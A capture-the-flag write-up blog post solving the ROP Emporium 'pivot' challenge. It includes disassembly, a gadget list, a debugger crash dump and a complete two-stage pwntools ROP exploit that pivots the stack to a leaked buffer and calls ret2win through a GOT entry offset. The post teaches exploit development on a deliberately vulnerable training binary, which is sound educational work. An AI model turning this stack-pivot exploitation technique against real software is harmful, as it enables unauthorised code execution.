---
layout:     post
title:      'ROP Emporium - pivot'
date:       2019-03-06 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

In this challenge from ROP Emporium, our stack space is quite limited and we have to find a way to pivot the payload somewhere else in the binary. Our goal is to call `ret2win` function, which is located in `libpivot.so` shared object. 

Firstly, let's get some information about our target. 

```
[w3ndige@main pivot]$ rabin2 -I ./pivot 
arch     x86
baddr    0x400000
binsz    11395
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    ./
static   false
stripped false
subsys   linux
va       true
```

Target binary `pivot` is using `nx` bit, but that's not something unusal in those challenges. What we have to start with is looking at disassembly of the both binary and shared object. 

```text
[w3ndige@main pivot]$ r2 -AAA ./pivot 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- There's more than one way to skin a cat
[0x004008a0]> afl
0x004007b8    3 26           sym._init
0x004007f0    1 6            sym.imp.free
0x00400800    1 6            sym.imp.puts
0x00400810    1 6            sym.imp.printf
0x00400820    1 6            sym.imp.memset
0x00400830    1 6            sym.imp.__libc_start_main
0x00400840    1 6            sym.imp.fgets
0x00400850    1 6            sym.imp.foothold_function
0x00400860    1 6            sym.imp.malloc
0x00400870    1 6            sym.imp.setvbuf
0x00400880    1 6            sym.imp.exit
0x00400890    1 6            sub.__gmon_start_400890
0x004008a0    1 41           entry0
0x004008d0    4 50   -> 41   sym.deregister_tm_clones
0x00400910    4 58   -> 55   sym.register_tm_clones
0x00400950    3 28           sym.__do_global_dtors_aux
0x00400970    4 38   -> 35   entry.init0
0x00400996    1 165          sym.main
0x00400a3b    1 167          sym.pwnme
0x00400ae2    1 24           sym.uselessFunction
0x00400b10    4 101          sym.__libc_csu_init
0x00400b80    1 2            sym.__libc_csu_fini
0x00400b84    1 9            sym._fini
```

Here with `radare2` we can see two functions that, at first, may help us. They are `pwnme` and `uselessFunction`. 

```text
[0x004008a0]> pdf @sym.pwnme
/ (fcn) sym.pwnme 167
|   sym.pwnme (int arg1);
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; arg int arg1 @ rdi
|           ; CALL XREF from sym.main (0x400a11)
|           0x00400a3b      55             push rbp
|           0x00400a3c      4889e5         mov rbp, rsp
|           0x00400a3f      4883ec30       sub rsp, 0x30               ; '0'
|           0x00400a43      48897dd8       mov qword [local_28h], rdi  ; arg1
|           0x00400a47      488d45e0       lea rax, [local_20h]
|           0x00400a4b      ba20000000     mov edx, 0x20               ; 32
|           0x00400a50      be00000000     mov esi, 0
|           0x00400a55      4889c7         mov rdi, rax
|           0x00400a58      e8c3fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00400a5d      bfc00b4000     mov edi, str.Call_ret2win___from_libpivot.so ; 0x400bc0 ; "Call ret2win() from libpivot.so"
|           0x00400a62      e899fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400a67      488b45d8       mov rax, qword [local_28h]
|           0x00400a6b      4889c6         mov rsi, rax
|           0x00400a6e      bfe00b4000     mov edi, str.The_Old_Gods_kindly_bestow_upon_you_a_place_to_pivot:__p ; 0x400be0 ; "The Old Gods kindly bestow upon you a place to pivot: %p\n"
|           0x00400a73      b800000000     mov eax, 0
|           0x00400a78      e893fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400a7d      bf200c4000     mov edi, str.Send_your_second_chain_now_and_it_will_land_there ; 0x400c20 ; "Send your second chain now and it will land there"
|           0x00400a82      e879fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400a87      bf520c4000     mov edi, 0x400c52
|           0x00400a8c      b800000000     mov eax, 0
|           0x00400a91      e87afdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400a96      488b15f31520.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0
|           0x00400a9d      488b45d8       mov rax, qword [local_28h]
|           0x00400aa1      be00010000     mov esi, 0x100              ; 256
|           0x00400aa6      4889c7         mov rdi, rax
|           0x00400aa9      e892fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400aae      bf580c4000     mov edi, str.Now_kindly_send_your_stack_smash ; 0x400c58 ; "Now kindly send your stack smash"
|           0x00400ab3      e848fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400ab8      bf520c4000     mov edi, 0x400c52
|           0x00400abd      b800000000     mov eax, 0
|           0x00400ac2      e849fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400ac7      488b15c21520.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0
|           0x00400ace      488d45e0       lea rax, [local_20h]
|           0x00400ad2      be40000000     mov esi, 0x40               ; '@' ; 64
|           0x00400ad7      4889c7         mov rdi, rax
|           0x00400ada      e861fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400adf      90             nop
|           0x00400ae0      c9             leave
\           0x00400ae1      c3             ret
```

Here we can see that things get a little bit more complicated during this challenge, comparing to the previous ones. We have two *stages* of shellcode. First one called *second* will do an `fgets` on some previously allocated buffer. 

Later `fgets` is exactly what we've used in the previous challenges, allowing us to overflow the buffer and overflow `esp` with `40` bytes offset.

After that, let's take a look at `uselessFunction`. 

```text
[0x004008a0]> pdf @sym.uselessFunction
/ (fcn) sym.uselessFunction 24
|   sym.uselessFunction ();
|           0x00400ae2      55             push rbp
|           0x00400ae3      4889e5         mov rbp, rsp
|           0x00400ae6      b800000000     mov eax, 0
|           0x00400aeb      e860fdffff     call sym.imp.foothold_function
|           0x00400af0      bf01000000     mov edi, 1
\           0x00400af5      e886fdffff     call sym.imp.exit           ; void exit(int status)
```

Here we can see that it just calles the `foothold_function` from the `libpivot.so` shared object. But `uselessFunction` isn't called anywhere in the code, so in order to get something from the shared object, we have to first call the `foothold_function` to populate the `.got.plt` entry. 

We'll come back later to it, but with that knowledge in mind, let's take a look at the functions from the shared object. 

```text
[w3ndige@main pivot]$ r2 -AAA libpivot.so 
[Invalid instruction of 16331 bytes at 0x7cd entry0 (aa)
Invalid instruction of 16330 bytes at 0x38
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- Hold on, this should never happen!
[0x00000870]> afl
0x00000000    3 124  -> 109  sym.imp.__cxa_finalize
0x000007f8    3 26           sym._init
0x00000830    1 6            sym.imp.system
0x00000840    1 6            sym.imp.printf
0x00000850    1 6            sym.imp.exit
0x00000860    1 6            sub.__gmon_start_860
0x00000868    1 6            sub.__cxa_finalize_868
0x00000870    4 50   -> 44   entry0
0x000008b0    4 66   -> 57   sym.register_tm_clones
0x00000900    5 50           sym.__do_global_dtors_aux
0x00000940    4 48   -> 42   entry.init0
0x00000970    1 24           sym.foothold_function
0x00000988    1 31           sym.void_function_01
0x000009a7    1 31           sym.void_function_02
0x000009c6    1 31           sym.void_function_03
0x000009e5    1 31           sym.void_function_04
0x00000a04    1 31           sym.void_function_05
0x00000a23    1 31           sym.void_function_06
0x00000a42    1 31           sym.void_function_07
0x00000a61    1 31           sym.void_function_08
0x00000a80    1 31           sym.void_function_09
0x00000a9f    1 31           sym.void_function_10
0x00000abe    1 26           sym.ret2win
0x00000ad8    1 9            sym._fini
[0x00000870]> pdf @sym.ret2win
/ (fcn) sym.ret2win 26
|   sym.ret2win ();
|           0x00000abe      55             push rbp
|           0x00000abf      4889e5         mov rbp, rsp
|           0x00000ac2      488d3d880000.  lea rdi, str.bin_cat_flag.txt ; 0xb51 ; "/bin/cat flag.txt"
|           0x00000ac9      e862fdffff     call sym.imp.system         ; int system(const char *string)
|           0x00000ace      bf00000000     mov edi, 0
\           0x00000ad3      e878fdffff     call sym.imp.exit           ; void exit(int status)
```

Here we can see that there is a bunch of functions, our `foothold_function` and desired `ret2win` function, which views the flag for us. 

From the description of the challenge we know that our stack is limited, but how much can we fit in it? I decided to use `gdb` and get input of `100` A's into the second `fgets` in order to view how much information can we hold.

```text
^F[w3ndige@main pivot]$ gdb ./pivot 
GNU gdb (GDB) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./pivot...(no debugging symbols found)...done.
gdb-peda$ r 
Starting program: /home/w3ndige/hacking/rop-emporium/pivot/pivot 
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7bc9f10
Send your second chain now and it will land there
> a
Now kindly send your stack smash
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdca0 ('A' <repeats 63 times>)
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x7fffffffdca0 ('A' <repeats 63 times>)
RSI: 0x7ffff7d8e730 --> 0x0 
RDI: 0x7fffffffdca1 ('A' <repeats 62 times>)
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdcc8 ('A' <repeats 23 times>)
RIP: 0x400ae1 (<pwnme+166>:	ret)
R8 : 0x0 
R9 : 0x7ffff7d8e720 --> 0x0 
R10: 0x7ffff7bcb740 (0x00007ffff7bcb740)
R11: 0x246 
R12: 0x4008a0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffddc0 --> 0x1 
R14: 0x0 
R15: 0x0
...
Stopped reason: SIGSEGV
0x0000000000400ae1 in pwnme ()
gdb-peda$ x/s $rsp
0x7fffffffdcc8:	'A' <repeats 23 times>
gdb-peda$ x/10gx $rsp
0x7fffffffdcc8:	0x4141414141414141	0x4141414141414141
0x7fffffffdcd8:	0x0041414141414141	0x0000000000400b10
0x7fffffffdce8:	0x00007ffff7bf2223	0x0000000000000000
0x7fffffffdcf8:	0x00007fffffffddc8	0x0000000100000000
0x7fffffffdd08:	0x0000000000400996	0x0000000000000000
```

With that process, we can see that there is space for only three `qwords`. And with those `qwords` we have to somehow pivot our space into a bigger one.

But if you've paid attention during the disassembly, we can see that while running it, binary prints an address of the buffer, that is also used in the first `fgets`. With that, we can quite nicely change the value of `rsp` to point to that buffer, which will hold our second stage of the ROP chain.

Now, let's use `ropper` to get all gadgets available in the binary. From that, we can form first stage of our exploit. 

```text
[w3ndige@main pivot]$ ropper --file pivot 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x0000000000400b7f: add bl, dh; ret; 
0x0000000000400984: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400b7d: add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400982: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400b7b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004008fc: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400a35: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x0000000000400a36: add byte ptr [rax], al; add cl, cl; ret; 
0x00000000004007cb: add byte ptr [rax], al; add rsp, 8; ret; 
0x0000000000400af3: add byte ptr [rax], al; call 0x880; nop word ptr [rax + rax]; pop rax; ret; 
0x0000000000400ad5: add byte ptr [rax], al; mov rdi, rax; call 0x840; nop; leave; ret; 
0x0000000000400afe: add byte ptr [rax], al; pop rax; ret; 
0x00000000004008fe: add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400b82: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x0000000000400a37: add byte ptr [rax], al; leave; ret; 
0x0000000000400afd: add byte ptr [rax], r8b; pop rax; ret; 
0x0000000000400a38: add cl, cl; ret; 
0x0000000000400af1: add dword ptr [rax], eax; add byte ptr [rax], al; call 0x880; nop word ptr [rax + rax]; pop rax; ret; 
0x0000000000400964: add eax, 0x20173e; add ebx, esi; ret; 
0x0000000000400b0a: add eax, ebp; ret; 
0x0000000000400969: add ebx, esi; ret; 
0x00000000004007ce: add esp, 8; ret; 
0x0000000000400b09: add rax, rbp; ret; 
0x00000000004007cd: add rsp, 8; ret; 
0x00000000004008f2: and byte ptr [rax], ah; jmp rax; 
0x0000000000400967: and byte ptr [rax], al; add ebx, esi; ret; 
0x0000000000400a25: call 0x7f0; mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret; 
0x0000000000400a2f: call 0x800; mov eax, 0; leave; ret; 
0x0000000000400ada: call 0x840; nop; leave; ret; 
0x0000000000400aeb: call 0x850; mov edi, 1; call 0x880; nop word ptr [rax + rax]; pop rax; ret; 
0x0000000000400af5: call 0x880; nop word ptr [rax + rax]; pop rax; ret; 
0x0000000000400995: call qword ptr [rbp + 0x48]; 
0x000000000040098e: call rax; 
0x0000000000400ca3: call rsp; 
0x0000000000400b5c: fmul qword ptr [rax - 0x7d]; ret; 
0x0000000000400d9b: jmp qword ptr [rbp]; 
0x0000000000400d5b: jmp qword ptr [rdi]; 
0x0000000000400af9: jmp qword ptr [rsi + 0xf]; 
0x00000000004008f5: jmp rax; 
0x0000000000400961: lcall [rbp - 0x3a]; add eax, 0x20173e; add ebx, esi; ret; 
0x0000000000400a34: mov eax, 0; leave; ret; 
0x0000000000400b06: mov eax, dword ptr [rax]; ret; 
0x000000000040098c: mov ebp, esp; call rax; 
0x0000000000400a2a: mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret; 
0x00000000004008f0: mov edi, 0x602078; jmp rax; 
0x0000000000400af0: mov edi, 1; call 0x880; nop word ptr [rax + rax]; pop rax; ret; 
0x0000000000400ad8: mov edi, eax; call 0x840; nop; leave; ret; 
0x0000000000400ad2: mov esi, 0x40; mov rdi, rax; call 0x840; nop; leave; ret; 
0x0000000000400b05: mov rax, qword ptr [rax]; ret; 
0x000000000040098b: mov rbp, rsp; call rax; 
0x0000000000400ad7: mov rdi, rax; call 0x840; nop; leave; ret; 
0x0000000000400afb: nop dword ptr [rax + rax]; pop rax; ret; 
0x00000000004008f8: nop dword ptr [rax + rax]; pop rbp; ret; 
0x0000000000400945: nop dword ptr [rax]; pop rbp; ret; 
0x0000000000400afa: nop word ptr [rax + rax]; pop rax; ret; 
0x00000000004008f7: nop word ptr [rax + rax]; pop rbp; ret; 
0x0000000000400a2c: or eax, dword ptr [rax]; call 0x800; mov eax, 0; leave; ret; 
0x0000000000400b6c: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400b6e: pop r13; pop r14; pop r15; ret; 
0x0000000000400b70: pop r14; pop r15; ret; 
0x0000000000400b72: pop r15; ret; 
0x0000000000400b00: pop rax; ret; 
0x00000000004008ef: pop rbp; mov edi, 0x602078; jmp rax; 
0x0000000000400b6b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400b6f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400900: pop rbp; ret; 
0x0000000000400b73: pop rdi; ret; 
0x0000000000400b71: pop rsi; pop r15; ret; 
0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret; 
0x000000000040098a: push rbp; mov rbp, rsp; call rax; 
0x0000000000400aca: ret 0x2015; 
0x0000000000400987: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400b85: sub esp, 8; add rsp, 8; ret; 
0x0000000000400b84: sub rsp, 8; add rsp, 8; ret; 
0x00000000004008fa: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400b03: xchg eax, esp; ret; 
0x0000000000400b02: xchg rax, rsp; ret; 
0x0000000000400989: int1; push rbp; mov rbp, rsp; call rax; 
0x0000000000400a39: leave; ret; 
0x0000000000400adf: nop; leave; ret; 
0x00000000004007c9: ret; 

81 gadgets found
```

After a little bit of analyzing, I can clearly see the gadgets for the first stage. 

* Firstly let's use `0x0000000000400b00: pop rax; ret;` 
* Then we can use the second place to enter the address of the buffer.
* Lastly swap values with `0x0000000000400b02: xchg rax, rsp; ret;` 

Easy right? 

But what will we do after that? Firstly, one thing to consider is how we can get the address of `ret2win` function if we do not now it's address because of ASLR. Luckily, we can calculate the offset from the `foothold_function` and then, during second stage just add the calculated value.

Coming back to functions from the shared object, let's check these addresses. 

```python
>>> hex(0x00000abe - 0x00000970)
'0x14e'
```

And here we have our offset. What we'll need is also the address of the `foothold_function` in `plt` entry and in `got` entry. First one, we can get from the `afl` command used earlier today, which is `0x00400850`. For `got` entry, we can just use `ir` command from `radare2` to view informationa about relocations. 

```text
[0x004008a0]> ir
[Relocations]
vaddr=0x00601ff8 paddr=0x00001ff8 type=SET_64 __gmon_start__
vaddr=0x00602080 paddr=0x00602080 type=SET_64
vaddr=0x00602090 paddr=0x00602090 type=SET_64
vaddr=0x006020a0 paddr=0x006020a0 type=SET_64
vaddr=0x00602018 paddr=0x00002018 type=SET_64 free
vaddr=0x00602020 paddr=0x00002020 type=SET_64 puts
vaddr=0x00602028 paddr=0x00002028 type=SET_64 printf
vaddr=0x00602030 paddr=0x00002030 type=SET_64 memset
vaddr=0x00602038 paddr=0x00002038 type=SET_64 __libc_start_main
vaddr=0x00602040 paddr=0x00002040 type=SET_64 fgets
vaddr=0x00602048 paddr=0x00002048 type=SET_64 foothold_function
vaddr=0x00602050 paddr=0x00002050 type=SET_64 malloc
vaddr=0x00602058 paddr=0x00002058 type=SET_64 setvbuf
vaddr=0x00602060 paddr=0x00002060 type=SET_64 exit

14 relocations
```

And here we can see the address of `0x00602048`. Now let's start crafting our attack scenario of the second stage. 

* Firstly, let's call the `foothold_function` to populate the .got.plt entry.
* After that pop the value of `foothold_function`'s `got` entry into the register `rax`.
* After that, we can move the the value from the address `rax` into `rax`. 
* Now in `rax` we should have the contents of `got` entry for `foothold_function`. 
* Add the offset to the `rax` register to get our `ret2win` function.
* Call it.

After all these steps, we should have a working exploit. All of these step are compatible with the gadgets that are present in the binary. And in the end, here is my exploit.

```python
from pwn import *

# Gadgets

pop_rax             = p64(0x0000000000400b00)
xchg_rax_rsp        = p64(0x0000000000400b02)
mov_rax_mrax        = p64(0x0000000000400b05)
pop_rbp             = p64(0x0000000000400900)
add_rax_rbp         = p64(0x0000000000400b09)
call_rax            = p64(0x000000000040098e)

# Addresses

foothold_plt        = p64(0x00400850)
foothold_got        = p64(0x00602048)

pivot = process('./pivot')
heap_address = int(pivot.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:').decode('UTF-8').split(' ')[-1], 16)
print(hex(heap_address))

heap_address = p64(heap_address)

pid = util.proc.pidof(pivot)[0]
print("[*] PID = " + str(pid))

# Uncomment this if you want to use the debugger
#util.proc.wait_for_debugger(pid)

second_stage = b""
second_stage += foothold_plt
second_stage += pop_rax
second_stage += foothold_got
second_stage += mov_rax_mrax
second_stage += pop_rbp
second_stage += p64(0x14e)
second_stage += add_rax_rbp
second_stage += call_rax

pivot.recvuntil("Send your second chain now and it will land there")
pivot.sendline(second_stage)

first_stage = b"A" * 40
first_stage += pop_rax
first_stage += heap_address
first_stage += xchg_rax_rsp

pivot.recvuntil("Now kindly send your stack smash")
pivot.sendline(first_stage)

output = pivot.recvall()
print(output)
```

Upon execution, we get the flag.

```text
[w3ndige@main pivot]$ python exploit.py 
[+] Starting program './pivot': Done
0x7f9448ab7f10
[*] PID = 9098
[+] Recieving all data: Done (120B)
[*] Program './pivot' stopped with exit code 0
b'\n> foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.soROPE{a_placeholder_32byte_flag!}\n'
```